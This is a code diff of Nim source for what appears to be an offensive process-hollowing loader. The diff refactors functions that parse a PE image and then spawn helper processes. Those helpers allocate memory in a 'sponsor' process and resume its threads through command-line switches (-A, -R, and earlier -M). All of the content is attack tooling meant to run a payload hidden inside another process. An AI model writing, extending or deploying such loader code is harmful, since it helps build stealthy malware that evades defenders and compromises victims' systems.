@@ -12,29 +12,6 @@ include syscalls
 # Resume            -> -R:<sponsor-thread-handle>
 
 
-proc createProcessWorker(arg: string): PPROCESS_INFORMATION =
-
-    var processCmd = getAppFilename() & " " & arg
-    var si: STARTUPINFOA
-    var pi: PROCESS_INFORMATION
-    if CreateProcessA(
-        NULL,
-        cast[LPSTR](addr processCmd[0]),
-        NULL,
-        NULL, 
-        TRUE,
-        0, # CREATE_SUSPENDED,
-        NULL,
-        NULL,
-        addr si,
-        addr pi
-    ) != TRUE:
-        echo $GetLastError()
-        quit()
-
-    return addr pi
-
-
 proc allocateMemoryProcess(
     processHandle: Handle, 
     peImageImageBase: ptr PVOID, 
@@ -146,6 +123,29 @@ proc resumeThreadProcess(
     quit(0)
 
 
+proc createProcessWorker(arg: string): PPROCESS_INFORMATION =
+
+    var processCmd = getAppFilename() & " " & arg
+    var si: STARTUPINFOA
+    var pi: PROCESS_INFORMATION
+    if CreateProcessA(
+        NULL,
+        cast[LPSTR](addr processCmd[0]),
+        NULL,
+        NULL, 
+        TRUE,
+        0, # CREATE_SUSPENDED,
+        NULL,
+        NULL,
+        addr si,
+        addr pi
+    ) != TRUE:
+        echo $GetLastError()
+        quit()
+
+    return addr pi
+
+
 proc manager(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImageImageBase: PVOID): bool =
     
     # Vars to check childen processes
@@ -191,7 +191,27 @@ proc manager(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImageImageBase
         quit(1)
 
 
-proc splittedNimlineHollow*(peStr: string, processInfoAddress: PPROCESS_INFORMATION) =
+proc splittedNimlineHollowManager*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
+  
+    # Parse PE
+    var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
+    var peBytesPtr = addr peBytes[0]
+    var peImageDosHeader = cast[ptr IMAGE_DOS_HEADER](peBytesPtr)
+    var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS64]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
+    var peImageImageBase = cast[PVOID](peImageNtHeaders.OptionalHeader.ImageBase)
+    
+    # Extract process information
+    let sponsorProcessHandle = processInfoAddress.hProcess
+    let sponsorThreadHandle = processInfoAddress.hThread
+    let sponsorPid = processInfoAddress.dwProcessId
+    let sponsorTid = processInfoAddress.dwThreadId
+    when not defined(release): echo "[i] Sponsor PID: " & $sponsorPid
+    when not defined(release): echo "[i] Sponsor TID: " & $sponsorTid
+
+    discard manager(sponsorProcessHandle, sponsorThreadHandle, peImageImageBase)
+
+ 
+proc splittedNimlineHollowWorker*(peStr: string): bool =
   
     # Parse PE
     var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
@@ -204,18 +224,10 @@ proc splittedNimlineHollow*(peStr: string, processInfoAddress: PPROCESS_INFORMAT
     var peImageImageBase = cast[PVOID](peImageNtHeaders.OptionalHeader.ImageBase)
     var peImageEntryPoint = cast[PVOID](peImageNtHeaders.OptionalHeader.AddressOfEntryPoint)
     
-    # Extract process information
-    let sponsorProcessHandle = processInfoAddress.hProcess
-    let sponsorThreadHandle = processInfoAddress.hThread
-    let sponsorPid = processInfoAddress.dwProcessId
-    let sponsorTid = processInfoAddress.dwThreadId
-    when not defined(release): echo "[i] Sponsor PID: " & $sponsorPid
-    when not defined(release): echo "[i] Sponsor TID: " & $sponsorTid
-
     # Extract process parameters
     let commandLineParams = commandLineParams()
 
-    # Parse command line arg
+    # Parse command line args
     for i in commandLineParams:
         if i.startsWith("-A:"):
             allocateMemoryProcess(
@@ -242,7 +254,5 @@ proc splittedNimlineHollow*(peStr: string, processInfoAddress: PPROCESS_INFORMAT
             resumeThreadProcess(
                 parseInt(i.replace("-R:", ""))
             )
-        elif i == "-M":
-            discard manager(sponsorProcessHandle, sponsorThreadHandle, peImageImageBase)
         else:
             quit(1)
